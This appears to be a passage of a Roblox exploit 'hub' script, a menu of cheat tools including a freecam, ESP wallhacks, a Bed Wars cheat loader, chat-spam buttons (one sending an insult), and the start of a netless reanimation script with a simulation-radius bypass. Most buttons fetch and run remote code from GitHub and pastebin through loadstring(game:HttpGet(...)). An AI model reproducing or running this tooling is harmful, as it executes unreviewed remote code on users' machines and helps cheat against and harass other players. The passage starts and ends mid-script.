wait()
-----------------------------------------------------------------------
-- Freecam
-- Cinematic free camera for spectating and video production.
-- Shift+P to toggle freecam
-- Q and E to go up and down
-- Have fun!
------------------------------------------------------------------------

function sandbox(var,func)
local env = getfenv(func)
local newenv = setmetatable({},{
__index = function(self,k)
if k=="script" then
return var
else
return env[k]
end
end,
})
setfenv(func,newenv)
return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
LocalScript0 = Instance.new("LocalScript")
LocalScript0.Name = "FreeCamera"
LocalScript0.Parent = mas
table.insert(cors,sandbox(LocalScript0,function()

local pi    = math.pi
local abs   = math.abs
local clamp = math.clamp
local exp   = math.exp
local rad   = math.rad
local sign  = math.sign
local sqrt  = math.sqrt
local tan   = math.tan

local ContextActionService = game:GetService("ContextActionService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then
Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
LocalPlayer = Players.LocalPlayer
end

local Camera = workspace.CurrentCamera
workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
local newCamera = workspace.CurrentCamera
if newCamera then
Camera = newCamera
end
end)

------------------------------------------------------------------------

local TOGGLE_INPUT_PRIORITY = Enum.ContextActionPriority.Low.Value
local INPUT_PRIORITY = Enum.ContextActionPriority.High.Value
local FREECAM_MACRO_KB = {Enum.KeyCode.LeftShift, Enum.KeyCode.P}

local NAV_GAIN = Vector3.new(1, 1, 1)*64
local PAN_GAIN = Vector2.new(0.75, 1)*8
local FOV_GAIN = 300

local PITCH_LIMIT = rad(90)

local VEL_STIFFNESS = 1.5
local PAN_STIFFNESS = 1.0
local FOV_STIFFNESS = 4.0

------------------------------------------------------------------------

local Spring = {} do
Spring.__index = Spring

function Spring.new(freq, pos)
local self = setmetatable({}, Spring)
self.f = freq
self.p = pos
self.v = pos*0
return self
end

function Spring:Update(dt, goal)
local f = self.f*2*pi
local p0 = self.p
local v0 = self.v

local offset = goal - p0
local decay = exp(-f*dt)

local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
local v1 = (f*dt*(offset*f - v0) + v0)*decay

self.p = p1
self.v = v1

return p1
end

function Spring:Reset(pos)
self.p = pos
self.v = pos*0
end
end

------------------------------------------------------------------------

local cameraPos = Vector3.new()
local cameraRot = Vector2.new()
local cameraFov = 0

local velSpring = Spring.new(VEL_STIFFNESS, Vector3.new())
local panSpring = Spring.new(PAN_STIFFNESS, Vector2.new())
local fovSpring = Spring.new(FOV_STIFFNESS, 0)

------------------------------------------------------------------------

local Input = {} do
local thumbstickCurve do
local K_CURVATURE = 2.0
local K_DEADZONE = 0.15

local function fCurve(x)
return (exp(K_CURVATURE*x) - 1)/(exp(K_CURVATURE) - 1)
end

local function fDeadzone(x)
return fCurve((x - K_DEADZONE)/(1 - K_DEADZONE))
end

function thumbstickCurve(x)
return sign(x)*clamp(fDeadzone(abs(x)), 0, 1)
end
end

local gamepad = {
ButtonX = 0,
ButtonY = 0,
DPadDown = 0,
DPadUp = 0,
ButtonL2 = 0,
ButtonR2 = 0,
Thumbstick1 = Vector2.new(),
Thumbstick2 = Vector2.new(),
}

local keyboard = {
W = 0,
A = 0,
S = 0,
D = 0,
E = 0,
Q = 0,
U = 0,
H = 0,
J = 0,
K = 0,
I = 0,
Y = 0,
Up = 0,
Down = 0,
LeftShift = 0,
RightShift = 0,
}

local mouse = {
Delta = Vector2.new(),
MouseWheel = 0,
}

local NAV_GAMEPAD_SPEED  = Vector3.new(1, 1, 1)
local NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
local PAN_MOUSE_SPEED    = Vector2.new(1, 1)*(pi/64)
local PAN_GAMEPAD_SPEED  = Vector2.new(1, 1)*(pi/8)
local FOV_WHEEL_SPEED    = 1.0
local FOV_GAMEPAD_SPEED  = 0.25
local NAV_ADJ_SPEED      = 0.75
local NAV_SHIFT_MUL      = 0.25

local navSpeed = 1

function Input.Vel(dt)
navSpeed = clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)

local kGamepad = Vector3.new(
thumbstickCurve(gamepad.Thumbstick1.x),
thumbstickCurve(gamepad.ButtonR2) - thumbstickCurve(gamepad.ButtonL2),
thumbstickCurve(-gamepad.Thumbstick1.y)
)*NAV_GAMEPAD_SPEED

local kKeyboard = Vector3.new(
keyboard.D - keyboard.A + keyboard.K - keyboard.H,
keyboard.E - keyboard.Q + keyboard.I - keyboard.Y,
keyboard.S - keyboard.W + keyboard.J - keyboard.U
)*NAV_KEYBOARD_SPEED

local shift = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsKeyDown(Enum.KeyCode.RightShift)

return (kGamepad + kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
end

function Input.Pan(dt)
local kGamepad = Vector2.new(
thumbstickCurve(gamepad.Thumbstick2.y),
thumbstickCurve(-gamepad.Thumbstick2.x)
)*PAN_GAMEPAD_SPEED
local kMouse = mouse.Delta*PAN_MOUSE_SPEED
mouse.Delta = Vector2.new()
return kGamepad + kMouse
end

function Input.Fov(dt)
local kGamepad = (gamepad.ButtonX - gamepad.ButtonY)*FOV_GAMEPAD_SPEED
local kMouse = mouse.MouseWheel*FOV_WHEEL_SPEED
mouse.MouseWheel = 0
return kGamepad + kMouse
end

do
local function Keypress(action, state, input)
keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
return Enum.ContextActionResult.Sink
end

local function GpButton(action, state, input)
gamepad[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
return Enum.ContextActionResult.Sink
end

local function MousePan(action, state, input)
local delta = input.Delta
mouse.Delta = Vector2.new(-delta.y, -delta.x)
return Enum.ContextActionResult.Sink
end

local function Thumb(action, state, input)
gamepad[input.KeyCode.Name] = input.Position
return Enum.ContextActionResult.Sink
end

local function Trigger(action, state, input)
gamepad[input.KeyCode.Name] = input.Position.z
return Enum.ContextActionResult.Sink
end

local function MouseWheel(action, state, input)
mouse[input.UserInputType.Name] = -input.Position.z
return Enum.ContextActionResult.Sink
end

local function Zero(t)
for k, v in pairs(t) do
t[k] = v*0
end
end

function Input.StartCapture()
ContextActionService:BindActionAtPriority("FreecamKeyboard", Keypress, false, INPUT_PRIORITY,
Enum.KeyCode.W, Enum.KeyCode.U,
Enum.KeyCode.A, Enum.KeyCode.H,
Enum.KeyCode.S, Enum.KeyCode.J,
Enum.KeyCode.D, Enum.KeyCode.K,
Enum.KeyCode.E, Enum.KeyCode.I,
Enum.KeyCode.Q, Enum.KeyCode.Y,
Enum.KeyCode.Up, Enum.KeyCode.Down
)
ContextActionService:BindActionAtPriority("FreecamMousePan",          MousePan,   false, INPUT_PRIORITY, Enum.UserInputType.MouseMovement)
ContextActionService:BindActionAtPriority("FreecamMouseWheel",        MouseWheel, false, INPUT_PRIORITY, Enum.UserInputType.MouseWheel)
ContextActionService:BindActionAtPriority("FreecamGamepadButton",     GpButton,   false, INPUT_PRIORITY, Enum.KeyCode.ButtonX, Enum.KeyCode.ButtonY)
ContextActionService:BindActionAtPriority("FreecamGamepadTrigger",    Trigger,    false, INPUT_PRIORITY, Enum.KeyCode.ButtonR2, Enum.KeyCode.ButtonL2)
ContextActionService:BindActionAtPriority("FreecamGamepadThumbstick", Thumb,      false, INPUT_PRIORITY, Enum.KeyCode.Thumbstick1, Enum.KeyCode.Thumbstick2)
end

function Input.StopCapture()
navSpeed = 1
Zero(gamepad)
Zero(keyboard)
Zero(mouse)
ContextActionService:UnbindAction("FreecamKeyboard")
ContextActionService:UnbindAction("FreecamMousePan")
ContextActionService:UnbindAction("FreecamMouseWheel")
ContextActionService:UnbindAction("FreecamGamepadButton")
ContextActionService:UnbindAction("FreecamGamepadTrigger")
ContextActionService:UnbindAction("FreecamGamepadThumbstick")
end
end
end

local function GetFocusDistance(cameraFrame)
local znear = 0.1
local viewport = Camera.ViewportSize
local projy = 2*tan(cameraFov/2)
local projx = viewport.x/viewport.y*projy
local fx = cameraFrame.rightVector
local fy = cameraFrame.upVector
local fz = cameraFrame.lookVector

local minVect = Vector3.new()
local minDist = 512

for x = 0, 1, 0.5 do
for y = 0, 1, 0.5 do
local cx = (x - 0.5)*projx
local cy = (y - 0.5)*projy
local offset = fx*cx - fy*cy + fz
local origin = cameraFrame.p + offset*znear
local part, hit = workspace:FindPartOnRay(Ray.new(origin, offset.unit*minDist))
local dist = (hit - origin).magnitude
if minDist > dist then
minDist = dist
minVect = offset.unit
end
end
end

return fz:Dot(minVect)*minDist
end

------------------------------------------------------------------------

local function StepFreecam(dt)
local vel = velSpring:Update(dt, Input.Vel(dt))
local pan = panSpring:Update(dt, Input.Pan(dt))
local fov = fovSpring:Update(dt, Input.Fov(dt))

local zoomFactor = sqrt(tan(rad(70/2))/tan(rad(cameraFov/2)))

cameraFov = clamp(cameraFov + fov*FOV_GAIN*(dt/zoomFactor), 1, 120)
cameraRot = cameraRot + pan*PAN_GAIN*(dt/zoomFactor)
cameraRot = Vector2.new(clamp(cameraRot.x, -PITCH_LIMIT, PITCH_LIMIT), cameraRot.y%(2*pi))

local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*NAV_GAIN*dt)
cameraPos = cameraCFrame.p

Camera.CFrame = cameraCFrame
Camera.Focus = cameraCFrame*CFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
Camera.FieldOfView = cameraFov
end

------------------------------------------------------------------------

local PlayerState = {} do
local mouseIconEnabled
local cameraSubject
local cameraType
local cameraFocus
local cameraCFrame
local cameraFieldOfView
local screenGuis = {}
local coreGuis = {
Backpack = true,
Chat = true,
Health = true,
PlayerList = true,
}
local setCores = {
BadgesNotificationsActive = true,
PointsNotificationsActive = true,
}

-- Save state and set up for freecam
function PlayerState.Push()
for name in pairs(coreGuis) do
coreGuis[name] = StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType[name])
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], false)
end
for name in pairs(setCores) do
setCores[name] = StarterGui:GetCore(name)
StarterGui:SetCore(name, false)
end
local playergui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
if playergui then
for _, gui in pairs(playergui:GetChildren()) do
if gui:IsA("ScreenGui") and gui.Enabled then
screenGuis[#screenGuis + 1] = gui
gui.Enabled = false
end
end
end

cameraFieldOfView = Camera.FieldOfView
Camera.FieldOfView = 70

cameraType = Camera.CameraType
Camera.CameraType = Enum.CameraType.Custom

cameraSubject = Camera.CameraSubject
Camera.CameraSubject = nil

cameraCFrame = Camera.CFrame
cameraFocus = Camera.Focus

mouseIconEnabled = UserInputService.MouseIconEnabled
UserInputService.MouseIconEnabled = false

mouseBehavior = UserInputService.MouseBehavior
UserInputService.MouseBehavior = Enum.MouseBehavior.Default
end

-- Restore state
function PlayerState.Pop()
for name, isEnabled in pairs(coreGuis) do
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], isEnabled)
end
for name, isEnabled in pairs(setCores) do
StarterGui:SetCore(name, isEnabled)
end
for _, gui in pairs(screenGuis) do
if gui.Parent then
gui.Enabled = true
end
end

Camera.FieldOfView = cameraFieldOfView
cameraFieldOfView = nil

Camera.CameraType = cameraType
cameraType = nil

Camera.CameraSubject = cameraSubject
cameraSubject = nil

Camera.CFrame = cameraCFrame
cameraCFrame = nil

Camera.Focus = cameraFocus
cameraFocus = nil

UserInputService.MouseIconEnabled = mouseIconEnabled
mouseIconEnabled = nil

UserInputService.MouseBehavior = mouseBehavior
mouseBehavior = nil
end
end

local function StartFreecam()
local cameraCFrame = Camera.CFrame
cameraRot = Vector2.new(cameraCFrame:toEulerAnglesYXZ())
cameraPos = cameraCFrame.p
cameraFov = Camera.FieldOfView

velSpring:Reset(Vector3.new())
panSpring:Reset(Vector2.new())
fovSpring:Reset(0)

PlayerState.Push()
RunService:BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, StepFreecam)
Input.StartCapture()
end

local function StopFreecam()
Input.StopCapture()
RunService:UnbindFromRenderStep("Freecam")
PlayerState.Pop()
end

------------------------------------------------------------------------

do
local enabled = false

local function ToggleFreecam()
if enabled then
StopFreecam()
else
StartFreecam()
end
enabled = not enabled
end

local function CheckMacro(macro)
for i = 1, #macro - 1 do
if not UserInputService:IsKeyDown(macro[i]) then
return
end
end
ToggleFreecam()
end

local function HandleActivationInput(action, state, input)
if state == Enum.UserInputState.Begin then
if input.KeyCode == FREECAM_MACRO_KB[#FREECAM_MACRO_KB] then
CheckMacro(FREECAM_MACRO_KB)
end
end
return Enum.ContextActionResult.Pass
end

ContextActionService:BindActionAtPriority("FreecamToggle", HandleActivationInput, false, TOGGLE_INPUT_PRIORITY, FREECAM_MACRO_KB[#FREECAM_MACRO_KB])
end
end))
for i,v in pairs(mas:GetChildren()) do
v.Parent = game:GetService("Players").LocalPlayer.PlayerGui
pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
spawn(function()
pcall(v)
end)
end
end)

Section:NewButton("Universal ESP", "ESP", function()
wait()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
end)
 
Section:NewButton("ESP GUI", "PRESS F4", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/espice", true))()
end)
 
Section:NewButton("ESP CREATE", "ESP", function()
wait()
--by danielgamer9799 - on ScriptBlox.com
local ESPGUI = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UIGradient = Instance.new("UIGradient")
local TItle = Instance.new("TextLabel")
local CreateESP = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local RemoveESP = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local CustomizeESP = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local UIGradient_2 = Instance.new("UIGradient")
local TItle_2 = Instance.new("TextLabel")
local FillColor = Instance.new("TextLabel")
local OutlineColor = Instance.new("TextLabel")
local FILL_R = Instance.new("TextBox")
local UICorner_5 = Instance.new("UICorner")
local FILL_G = Instance.new("TextBox")
local UICorner_6 = Instance.new("UICorner")
local FILL_B = Instance.new("TextBox")
local UICorner_7 = Instance.new("UICorner")
local OUT_B = Instance.new("TextBox")
local UICorner_8 = Instance.new("UICorner")
local OUT_R = Instance.new("TextBox")
local UICorner_9 = Instance.new("UICorner")
local OUT_G = Instance.new("TextBox")
local UICorner_10 = Instance.new("UICorner")
local FILL_PREVIEW = Instance.new("Frame")
local UICorner_11 = Instance.new("UICorner")
local out_PREVIEW = Instance.new("Frame")
local UICorner_12 = Instance.new("UICorner")
local RunService = game:GetService("RunService")
--Properties:
 
ESPGUI.Name = "ESPGUI"
ESPGUI.Parent = game.CoreGui
ESPGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ESPGUI.ResetOnSpawn = false
ESPGUI.IgnoreGuiInset = true
 
MainFrame.Name = "MainFrame"
MainFrame.Parent = ESPGUI
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.Position = UDim2.new(0.365747452, 0, 0.03125, 0)
MainFrame.Size = UDim2.new(0, 187, 0, 103)
MainFrame.Active = true
MainFrame.Draggable = true
 
UICorner.Parent = MainFrame
 
UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(51, 143, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(14, 90, 255))}
UIGradient.Parent = MainFrame
 
TItle.Name = "TItle"
TItle.Parent = MainFrame
TItle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TItle.BackgroundTransparency = 1.000
TItle.Size = UDim2.new(0, 187, 0, 32)
TItle.Font = Enum.Font.GothamBlack
TItle.Text = "ESP GUI"
TItle.TextColor3 = Color3.fromRGB(255, 255, 255)
TItle.TextSize = 14.000
 
CreateESP.Name = "CreateESP"
CreateESP.Parent = MainFrame
CreateESP.BackgroundColor3 = Color3.fromRGB(90, 255, 19)
CreateESP.Position = UDim2.new(0.155080214, 0, 0.242718458, 0)
CreateESP.Size = UDim2.new(0, 128, 0, 23)
CreateESP.Font = Enum.Font.GothamBlack
CreateESP.Text = "Create ESP"
CreateESP.TextColor3 = Color3.fromRGB(255, 255, 255)
CreateESP.TextSize = 14.000
 
UICorner_2.Parent = CreateESP
 
RemoveESP.Name = "RemoveESP"
RemoveESP.Parent = MainFrame
RemoveESP.BackgroundColor3 = Color3.fromRGB(255, 92, 11)
RemoveESP.Position = UDim2.new(0.155080214, 0, 0.524271846, 0)
RemoveESP.Size = UDim2.new(0, 128, 0, 23)
RemoveESP.Font = Enum.Font.GothamBlack
RemoveESP.Text = "Remove ESP"
RemoveESP.TextColor3 = Color3.fromRGB(255, 255, 255)
RemoveESP.TextSize = 14.000
 
UICorner_3.Parent = RemoveESP
 
CustomizeESP.Name = "CustomizeESP"
CustomizeESP.Parent = ESPGUI
CustomizeESP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CustomizeESP.Position = UDim2.new(0.517416537, 0, 0.03125, 0)
CustomizeESP.Size = UDim2.new(0, 426, 0, 84)
CustomizeESP.Active = true
CustomizeESP.Draggable = true
 
UICorner_4.Parent = CustomizeESP
 
UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(51, 143, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(14, 90, 255))}
UIGradient_2.Parent = CustomizeESP
 
TItle_2.Name = "TItle"
TItle_2.Parent = CustomizeESP
TItle_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TItle_2.BackgroundTransparency = 1.000
TItle_2.Size = UDim2.new(0, 321, 0, 32)
TItle_2.Font = Enum.Font.GothamBlack
TItle_2.Text = "Customize ESP"
TItle_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TItle_2.TextSize = 14.000
 
FillColor.Name = "FillColor"
FillColor.Parent = CustomizeESP
FillColor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FillColor.BackgroundTransparency = 1.000
FillColor.Position = UDim2.new(0, 0, 0.195121944, 0)
FillColor.Size = UDim2.new(0, 81, 0, 32)
FillColor.Font = Enum.Font.GothamBlack
FillColor.Text = "Fill Color"
FillColor.TextColor3 = Color3.fromRGB(255, 255, 255)
FillColor.TextSize = 14.000
 
OutlineColor.Name = "OutlineColor"
OutlineColor.Parent = CustomizeESP
OutlineColor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OutlineColor.BackgroundTransparency = 1.000
OutlineColor.Position = UDim2.new(0.0267573483, 0, 0.589157462, 0)
OutlineColor.Size = UDim2.new(0, 81, 0, 32)
OutlineColor.Font = Enum.Font.GothamBlack
OutlineColor.Text = "Outline Color"
OutlineColor.TextColor3 = Color3.fromRGB(255, 255, 255)
OutlineColor.TextSize = 14.000
 
FILL_R.Name = "FILL_R"
FILL_R.Parent = CustomizeESP
FILL_R.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
FILL_R.Position = UDim2.new(0.252336442, 0, 0.333333343, 0)
FILL_R.Size = UDim2.new(0, 79, 0, 16)
FILL_R.Font = Enum.Font.GothamBlack
FILL_R.PlaceholderText = "R"
FILL_R.Text = ""
FILL_R.TextColor3 = Color3.fromRGB(255, 255, 255)
FILL_R.TextSize = 14.000
 
UICorner_5.Parent = FILL_R
 
FILL_G.Name = "FILL_G"
FILL_G.Parent = CustomizeESP
FILL_G.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
FILL_G.Position = UDim2.new(0.467428356, 0, 0.333333343, 0)
FILL_G.Size = UDim2.new(0, 79, 0, 16)
FILL_G.Font = Enum.Font.GothamBlack
FILL_G.PlaceholderText = "G"
FILL_G.Text = ""
FILL_G.TextColor3 = Color3.fromRGB(255, 255, 255)
FILL_G.TextSize = 14.000
 
UICorner_6.Parent = FILL_G
 
FILL_B.Name = "FILL_B"
FILL_B.Parent = CustomizeESP
FILL_B.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
FILL_B.Position = UDim2.new(0.705080032, 0, 0.333333343, 0)
FILL_B.Size = UDim2.new(0, 79, 0, 16)
FILL_B.Font = Enum.Font.GothamBlack
FILL_B.PlaceholderText = "B"
FILL_B.Text = ""
FILL_B.TextColor3 = Color3.fromRGB(255, 255, 255)
FILL_B.TextSize = 14.000
 
UICorner_7.Parent = FILL_B
 
OUT_B.Name = "OUT_B"
OUT_B.Parent = CustomizeESP
OUT_B.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OUT_B.Position = UDim2.new(0.705080032, 0, 0.678571463, 0)
OUT_B.Size = UDim2.new(0, 79, 0, 16)
OUT_B.Font = Enum.Font.GothamBlack
OUT_B.PlaceholderText = "B"
OUT_B.Text = ""
OUT_B.TextColor3 = Color3.fromRGB(255, 255, 255)
OUT_B.TextSize = 14.000
 
UICorner_8.Parent = OUT_B
 
OUT_R.Name = "OUT_R"
OUT_R.Parent = CustomizeESP
OUT_R.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OUT_R.Position = UDim2.new(0.252336442, 0, 0.678571463, 0)
OUT_R.Size = UDim2.new(0, 79, 0, 16)
OUT_R.Font = Enum.Font.GothamBlack
OUT_R.PlaceholderText = "R"
OUT_R.Text = ""
OUT_R.TextColor3 = Color3.fromRGB(255, 255, 255)
OUT_R.TextSize = 14.000
 
UICorner_9.Parent = OUT_R
 
OUT_G.Name = "OUT_G"
OUT_G.Parent = CustomizeESP
OUT_G.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OUT_G.Position = UDim2.new(0.467428356, 0, 0.678571463, 0)
OUT_G.Size = UDim2.new(0, 79, 0, 16)
OUT_G.Font = Enum.Font.GothamBlack
OUT_G.PlaceholderText = "G"
OUT_G.Text = ""
OUT_G.TextColor3 = Color3.fromRGB(255, 255, 255)
OUT_G.TextSize = 14.000
 
UICorner_10.Parent = OUT_G
 
FILL_PREVIEW.Name = "FILL_PREVIEW"
FILL_PREVIEW.Parent = CustomizeESP
FILL_PREVIEW.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FILL_PREVIEW.Position = UDim2.new(0.917840362, 0, 0.261904776, 0)
FILL_PREVIEW.Size = UDim2.new(0, 27, 0, 27)
 
UICorner_11.Parent = FILL_PREVIEW
 
out_PREVIEW.Name = "out_PREVIEW"
out_PREVIEW.Parent = CustomizeESP
out_PREVIEW.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
out_PREVIEW.Position = UDim2.new(0.917840362, 0, 0.642857134, 0)
out_PREVIEW.Size = UDim2.new(0, 27, 0, 25)
 
UICorner_12.Parent = out_PREVIEW
 
-- Scripts:
 
local function CSGPST_fake_script() -- CreateESP.LocalScript 
    local script = Instance.new('LocalScript', CreateESP)
 
    script.Parent.MouseButton1Click:Connect(function()
        local players = game.Players:GetPlayers()
        for _, v in pairs(players) do
            local FILL_R = tonumber(script.Parent.Parent.Parent.CustomizeESP.FILL_R.Text)
            local FILL_G = tonumber(script.Parent.Parent.Parent.CustomizeESP.FILL_G.Text)
            local FILL_B = tonumber(script.Parent.Parent.Parent.CustomizeESP.FILL_B.Text)
            local OUT_R = tonumber(script.Parent.Parent.Parent.CustomizeESP.OUT_R.Text)
            local OUT_G = tonumber(script.Parent.Parent.Parent.CustomizeESP.OUT_G.Text)
            local OUT_B = tonumber(script.Parent.Parent.Parent.CustomizeESP.OUT_B.Text) 
            local esp = Instance.new("Highlight")
            esp.Name = v.Name
            esp.FillTransparency = 0.3
            esp.FillColor = Color3.fromRGB(FILL_R, FILL_G, FILL_B)
            esp.OutlineColor = Color3.fromRGB(OUT_R, OUT_G, OUT_B)
            esp.OutlineTransparency = 0
            esp.Parent = v.Character
        end
    end)
end
coroutine.wrap(CSGPST_fake_script)()
local function BELCX_fake_script() -- RemoveESP.LocalScript 
    local script = Instance.new('LocalScript', RemoveESP)
 
    script.Parent.MouseButton1Click:Connect(function()
        local players = game.Players:GetPlayers()
        for _, v in pairs(players) do
            local esp = v.Character:FindFirstChild(v.Name)
            if esp then
                esp:Destroy()
            else
                warn("No ESP Found - Couldn't find Any ESP In the Character!")
            end
        end
    end)
end
coroutine.wrap(BELCX_fake_script)()
local function PBDY_fake_script() -- FILL_PREVIEW.LocalScript 
    local script = Instance.new('LocalScript', FILL_PREVIEW)
 
    while wait() do
        local FILL_R = tonumber(script.Parent.Parent.FILL_R.Text)
        local FILL_G = tonumber(script.Parent.Parent.FILL_G.Text)
        local FILL_B = tonumber(script.Parent.Parent.FILL_B.Text)
        local OUT_R = tonumber(script.Parent.Parent.OUT_R.Text)
        local OUT_G = tonumber(script.Parent.Parent.OUT_G.Text)
        local OUT_B = tonumber(script.Parent.Parent.OUT_B.Text) 
 
        script.Parent.BackgroundColor3 = Color3.fromRGB(FILL_R, FILL_G, FILL_B)
 
    end
end
coroutine.wrap(PBDY_fake_script)()
local function JPUFZ_fake_script() -- out_PREVIEW.LocalScript 
    local script = Instance.new('LocalScript', out_PREVIEW)
 
    while wait() do
        local FILL_R = tonumber(script.Parent.Parent.FILL_R.Text)
        local FILL_G = tonumber(script.Parent.Parent.FILL_G.Text)
        local FILL_B = tonumber(script.Parent.Parent.FILL_B.Text)
        local OUT_R = tonumber(script.Parent.Parent.OUT_R.Text)
        local OUT_G = tonumber(script.Parent.Parent.OUT_G.Text)
        local OUT_B = tonumber(script.Parent.Parent.OUT_B.Text) 
 
        script.Parent.BackgroundColor3 = Color3.fromRGB(OUT_R, OUT_G, OUT_B)
 
    end
end
coroutine.wrap(JPUFZ_fake_script)()
 
end)
 
local Tab = Window:NewTab("Hot Scripts")
 
local Section = Tab:NewSection("Hot Scripts by meetly")
 
Section:NewButton("Infiniteyield","hot script", function()
wait()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))() --nice!--
end)

Section:NewButton("KAT","(can crash on a weak computer)", function()
wait()
loadstring(game:HttpGet(('https://pastebin.com/raw/MHx8q6xP'),true))()
end)

Section:NewButton("Bed Wars (vape 4)", "-", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
end)

local Tab = Window:NewTab("links")

local Section = Tab:NewSection("Links")

Section:NewButton("copy link Discord server","-", function()
wait()
setclipboard("https://discord.gg/Hg8BJSMjEZ")
end)
 
local Tab = Window:NewTab("FUN")
 
local Section = Tab:NewSection("FUN SCRIPTS")
 
Section:NewButton("animation gui", "animate your player", function()
wait()
loadstring(game:HttpGet("https://pastebin.com/raw/4DaCDxAW"))()
end)

Section:NewButton("Kick you", "client kick", function()
wait()
game.Players.LocalPlayer:Kick('You kick) (by Meetly and Robojini)')
end)

Section:NewButton("Spam to chat (5x)", "-", function()
wait()
for i = 1, 5, 1 do
wait(0.3)
local A_1 = "Meetly Hub Boost"
local A_2 = "All"
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
Event:FireServer(A_1, A_2)
end
end)

Section:NewButton("Spam to chat (5x) (EZZ)", "-", function()
wait()
for i = 1, 5, 1 do
wait(0.3)
local A_1 = "EZZ"
local A_2 = "All"
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
Event:FireServer(A_1, A_2)
end
end)

Section:NewButton("Spam to chat (5x) (GG)", "-", function()
wait()
for i = 1, 5, 1 do
wait(0.3)
local A_1 = "GG"
local A_2 = "All"
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
Event:FireServer(A_1, A_2)
end
end)

Section:NewButton("Spam to chat (5x) (ti lox)", "-", function()
wait()
for i = 1, 5, 1 do
wait(0.3)
local A_1 = "ti lox"
local A_2 = "All"
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
Event:FireServer(A_1, A_2)
end
end)

Section:NewButton("filing", "FILING HAHAHAHA", function()
wait()
loadstring(game:HttpGet("https://pastebin.pl/view/raw/48f9f8ee"))() 
end)
 
Section:NewButton("AMOGUS", "among us", function()
wait()
--[[
Q - Lie
F - Fly
C - Sit
]]
 
 
 
 
local netboost = 1000 --velocity 
--netboost usage: 
--set to false to disable
--set to a vector3 value if you dont want the velocity to change
--set to a number to change the velocity in real time with magnitude equal to the number
local idleMag = 0.005 --used only in case netboost is set to a number value
--if magnitude of the real velocity of a part is lower than this
--then the fake velocity is being set to Vector3.new(0, netboost, 0)
--the lower value the less you jitter but you might loose network ownership
local simradius = "shp" --simulation radius (net bypass) method
--"shp" - sethiddenproperty
--"ssr" - setsimulationradius
--false - disable
local antiragdoll = true --removes hingeConstraints and ballSocketConstraints from your character
local newanimate = false --disables the animate script and enables after reanimation
local discharscripts = true --disables all localScripts parented to your character before reanimation
local R15toR6 = true --tries to convert your character to r6 if its r15
local addtools = false --puts all tools from backpack to character and lets you hold them after reanimation
local loadtime = game:GetService("Players").RespawnTime + 0.5 --anti respawn delay
local method = 3 --reanimation method
--methods:
--0 - breakJoints (takes [loadtime] seconds to laod)
--1 - limbs
--2 - limbs + anti respawn
--3 - limbs + breakJoints after [loadtime] seconds
--4 - remove humanoid + breakJoints
--5 - remove humanoid + limbs
local alignmode = 2 --AlignPosition mode
--modes:
--1 - AlignPosition rigidity enabled true
--2 - 2 AlignPositions rigidity enabled both true and false
--3 - AlignPosition rigidity enabled false
local hedafterneck = true --disable aligns for head and enable after neck is removed
 
local lp = game:GetService("Players").LocalPlayer
local rs = game:GetService("RunService")
local stepped = rs.Stepped
local heartbeat = rs.Heartbeat
